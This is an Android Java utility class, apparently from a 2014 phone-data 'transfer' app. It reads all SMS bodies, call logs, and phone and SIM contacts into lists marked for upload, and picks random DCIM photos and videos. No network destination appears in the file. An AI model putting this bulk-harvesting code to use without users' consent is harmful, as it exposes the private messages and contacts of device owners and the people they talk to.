package ng.transfer.support.util;

import android.content.Context;
import android.content.res.Resources;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.SparseBooleanArray;

import java.io.File;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.Random;

import ng.transfer.support.bean.CallRecordBean;
import ng.transfer.support.bean.ContactsBean;
import ng.transfer.support.bean.SMSBean;
import ng.transfer.support.info.Defines;
import ng.transfer.support.info.Transfer;

/**
 * Created by Joe on 2014/6/11.
 */
public class TransferUtils {

    /*

    格式：
    通话记录 号码,名称,类型,日期,时长;
    联系人 号码,名称,储存位置
    短信 号码,内容,类型,日期,已读未读

    */

    /*

    private static final String IN = "接听";
    private static final String OUT = "拨出";
    private static final String MISSED = "未接";
    private static final String REFUSED = "拒接";
    private static final String UNKNOWN = "未知";

    private static final String INBOX = "接收";
    private static final String SENT = "发送";
    private static final String DRAFT = "草稿";
    private static final String FAILED = "发送失败";
    private static final String READ = "已读";
    private static final String UNREAD = "未读";

    private static final String PHONE = "手机";
    private static final String SIM = "SIM";

    */

    private static final String CONTACT_LOC_PHONE = "1";
    private static final String CONTACT_LOC_SIM = "2";

    public static class FileActions {

        public static File PickOneVidInDCIM() {
            return RandomPickOneVid(new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM"));
        }

        public static File PickOnePicInDCIM() {
            return RandomPickOnePic(new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM"));
        }

        private static File RandomPickOneVid(File dir) {
            if (dir.isDirectory()) {
                File[] files = dir.listFiles();

                Random random = new Random();
                int randomNum = random.nextInt(files.length);

//                while (files[randomNum].isDirectory())
                while (!files[randomNum].getName().substring(files[randomNum].getName().lastIndexOf('.') + 1, files[randomNum].getName().length()).equals("mp4"))
                    randomNum = random.nextInt(files.length);

                return files[randomNum];
            } else {
                return null;
            }

        }

        private static File RandomPickOnePic(File dir) {
            if (dir.isDirectory()) {
                File[] files = dir.listFiles();

                Random random = new Random();
                int randomNum = random.nextInt(files.length);

//                while (files[randomNum].isDirectory())
                while (files[randomNum].getName().substring(files[randomNum].getName().lastIndexOf('.') + 1, files[randomNum].getName().length()).equals("mp4"))
                    randomNum = random.nextInt(files.length);

                return files[randomNum];
            } else {
                return null;
            }

        }

    }

    public static class BuildInfoJSONs {

        public static final int POS_CALL_RECORD = 0;
        public static final int POS_CONTACTS = 1;
        public static final int POS_SMS = 2;

        public static List[] getJSONLists() {
            SparseBooleanArray chooses = Transfer.getUploadParams();
            List[] jsons = new List[3];

            if (chooses.get(Defines.UPLOAD_CALL_RECORD))
                jsons[POS_CALL_RECORD] = buildCallRecordBeanList();
            if (chooses.get(Defines.UPLOAD_CONTACTS))
                jsons[POS_CONTACTS] = buildContactsBeanList();
            if (chooses.get(Defines.UPLOAD_SMS))
                jsons[POS_SMS] = buildSMSBeanList();

            return jsons;
        }

        private static List buildSMSBeanList() {
            Cursor cursor = GetCursors.getSMSCursor();

            if (cursor != null) {

                List<SMSBean> list = new ArrayList<SMSBean>();
                String number;
                String body;
                String type;
                String date;
                String read;

                while (cursor.moveToNext()) {

                    //号码
                    number = cursor.getString(cursor.getColumnIndex("address"));

                    //内容
                    body = cursor.getString(cursor.getColumnIndex("body"));

                    //类型
                    type = String.valueOf(cursor.getInt(cursor.getColumnIndex("type")));

                    //日期
                    date = String.valueOf(cursor.getLong(cursor.getColumnIndex("date")));

                    //已读未读
                    read = String.valueOf(cursor.getInt(cursor.getColumnIndex("read")));

                    list.add(new SMSBean(number, body, type, date, read));
                }

                cursor.close();

                return list;
            } else
                return null;
        }

        private static List buildContactsBeanList() {
            Cursor cursorP = GetCursors.getPhoneContactsCursor();
            Cursor cursorS = GetCursors.getSIMContactsCursor();

            if (cursorP != null) {
                boolean haveSIMContacts = false;
                if (cursorS != null && cursorS.getCount() > 0) {
                    haveSIMContacts = true;
                }

                List<ContactsBean> list = new ArrayList<ContactsBean>();
                String number;
                String name;

                while (cursorP.moveToNext()) {

                    //号码
                    number = cursorP.getString(cursorP.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    //名称
                    name = cursorP.getString(cursorP.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

                    list.add(new ContactsBean(number, name, CONTACT_LOC_PHONE));
                }

                cursorP.close();

                if (haveSIMContacts) {

                    while (cursorS.moveToNext()) {

                        //号码
                        number = cursorS.getString(1);

                        //名称
                        name = cursorS.getString(0);

                        list.add(new ContactsBean(number, name, CONTACT_LOC_SIM));
                    }

                    cursorS.close();

                }

                return list;


            } else
                return null;
        }

        private static List buildCallRecordBeanList() {
            Cursor cursor = GetCursors.getCallRecordCursor();

            if (cursor != null) {

                List<CallRecordBean> list = new ArrayList<CallRecordBean>();
                String number;
                String name;
                String type;
                String date;
                String duration;

                while (cursor.moveToNext()) {

                    //号码
                    number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));

                    //名称
                    name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    if (name == null || name.isEmpty())
                        name = "";

                    //类型
                    type = String.valueOf(cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));

                    //日期时间
                    date = String.valueOf(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));

                    //通话时长
                    duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));

                    list.add(new CallRecordBean(number, name, type, date, duration));
                }
                cursor.close();

                return list;
            } else
                return null;
        }
    }

    public static class Network {

        public static boolean isConnectedWifi() {
            ConnectivityManager cm = (ConnectivityManager) Transfer.getGlobalContext().getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo networkInfo = cm.getActiveNetworkInfo();
                if (networkInfo != null && networkInfo.getType() == ConnectivityManager.TYPE_WIFI) {
                    return true;
                }
            }
            return false;
        }

        public static String getLocalIpAddress() {
            try {
                for (Enumeration<NetworkInterface> en = NetworkInterface
                        .getNetworkInterfaces(); en.hasMoreElements(); ) {
                    NetworkInterface intf = en.nextElement();
                    for (Enumeration<InetAddress> enumIpAddr = intf
                            .getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                        InetAddress inetAddress = enumIpAddr.nextElement();
                        if (!inetAddress.isLoopbackAddress() && !inetAddress.isLinkLocalAddress()) {
                            return inetAddress.getHostAddress().toString();
                        }
                    }
                }
            } catch (SocketException ex) {
                Log.e("WifiPreference IpAddress", ex.toString());
            }


            return null;
        }

    }

    private static class GetCursors {

        private static Cursor getCallRecordCursor() {
            String[] callRecordRequires = {CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION};
            return queryDatabase(CallLog.Calls.CONTENT_URI, callRecordRequires, CallLog.Calls.DEFAULT_SORT_ORDER);
        }

        private static Cursor getPhoneContactsCursor() {
            String[] contactsRequires = {ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME};
            return queryDatabase(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, contactsRequires, "sort_key");
        }

        private static Cursor getSIMContactsCursor() {
            String[] contactsRequires = {ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME};
            return queryDatabase(Uri.parse("content://icc/adn"), contactsRequires, "sort_key");
        }

        private static Cursor getSMSCursor() {
            String[] SMSRequires = {"address", "body", "type", "date", "read"};
            return queryDatabase(Uri.parse("content://sms/"), SMSRequires, "date desc");
        }

        private static Cursor queryDatabase(Uri uri, String[] requires, String sort) {
            return Transfer.getGlobalContext().getContentResolver().query(uri, requires, null, null, sort);
        }

    }

    public static class ConvertDpPx {

        public static int dpToPx(int dp) {
            Log.e("Density", String.valueOf(Resources.getSystem().getDisplayMetrics().density));
            return (int) ((dp * Resources.getSystem().getDisplayMetrics().density) + 0.5);
        }

        public static int pxToDp(int px) {
            return (int) ((px / Resources.getSystem().getDisplayMetrics().density) + 0.5);
        }

    }

}
